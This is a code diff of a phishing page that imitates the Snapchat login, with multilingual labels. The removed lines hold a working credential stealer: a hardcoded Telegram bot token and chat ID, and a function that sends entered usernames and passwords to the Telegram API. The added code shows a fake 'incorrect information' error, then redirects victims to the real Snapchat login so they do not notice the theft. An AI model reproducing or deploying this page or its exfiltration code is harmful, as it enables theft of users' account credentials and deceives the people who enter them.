@@ -95,13 +95,20 @@
         .signup-btn:hover {
             text-decoration: underline;
         }
+
+        .message {
+            font-size: 16px;
+            color: red;
+            margin-top: 20px;
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/08/Snapchat-logo.png" alt="Snapchat Logo">
         <h1 id="title"></h1>
-        <form onsubmit="sendToTelegram(event)">
+        <form onsubmit="simulateLogin(event)">
             <label id="username-label" for="username"></label>
             <input type="text" id="username" name="username" required>
 
@@ -115,13 +122,10 @@
         <a class="signup-btn" href="https://accounts.snapchat.com/v2/signup?continue=%2Faccounts%2Fwelcome">
             Vous débutez sur Snapchat ? Sʼinscrire
         </a>
+        <div class="message" id="error-message"></div>
     </div>
 
     <script>
-        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
-        const chatId = '612575358';
-
-        // النصوص باللغات المختلفة
         const translations = {
             en: {
                 title: "Login",
@@ -129,6 +133,7 @@
                 passwordLabel: "Password",
                 forgotPassword: "Forgot your password?",
                 submitButton: "Login",
+                errorMessage: "Incorrect information. Please try again.",
             },
             fr: {
                 title: "Connexion",
@@ -136,6 +141,7 @@
                 passwordLabel: "Mot de passe",
                 forgotPassword: "Mot de passe oublié ?",
                 submitButton: "Connexion",
+                errorMessage: "Informations incorrectes. Veuillez réessayer.",
             },
             ar: {
                 title: "تسجيل الدخول",
@@ -143,16 +149,15 @@
                 passwordLabel: "كلمة المرور",
                 forgotPassword: "هل نسيت كلمة المرور؟",
                 submitButton: "تسجيل الدخول",
+                errorMessage: "المعلومات خاطئة. حاول مرة أخرى.",
             },
         };
 
-        // كشف اللغة
         function getLanguage() {
             const lang = navigator.language || navigator.userLanguage;
             return lang.split('-')[0]; // أخذ اللغة الأساسية فقط (مثل "en" من "en-US")
         }
 
-        // تطبيق الترجمة بناءً على اللغة المكتشفة
         function applyTranslations() {
             const lang = getLanguage();
             const texts = translations[lang] || translations["en"]; // افتراضي إلى الإنجليزية إذا كانت اللغة غير مدعومة
@@ -162,37 +167,33 @@
             document.getElementById("password-label").textContent = texts.passwordLabel;
             document.getElementById("forgot-password").textContent = texts.forgotPassword;
             document.getElementById("submit-button").textContent = texts.submitButton;
+            document.getElementById("error-message").textContent = texts.errorMessage;
         }
 
         applyTranslations();
 
-        function sendToTelegram(event) {
+        function simulateLogin(event) {
             event.preventDefault();
 
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
+            const errorMessage = document.getElementById("error-message");
+            let countdown = 5;
 
-            const message = `👤 Username: ${username}\n🔒 Password: ${password}`;
+            errorMessage.style.display = "block";
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert('تم الإرسال بنجاح!');
-                } else {
-                    alert('حدث خطأ أثناء الإرسال.');
+            const countdownInterval = setInterval(() => {
+                errorMessage.textContent = `${countdown}...`;
+                countdown--;
+
+                if (countdown < 0) {
+                    clearInterval(countdownInterval);
+                    errorMessage.textContent = translations[getLanguage()].errorMessage;
+
+                    // تأخير لإعادة المحاولة
+                    setTimeout(() => {
+                        window.location.href = "https://accounts.snapchat.com/accounts/login";
+                    }, 2000); // التوجيه بعد 2 ثانية
                 }
-            })
-            .catch(error => {
-                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
-            });
+            }, 1000);
         }
     </script>
 </body>
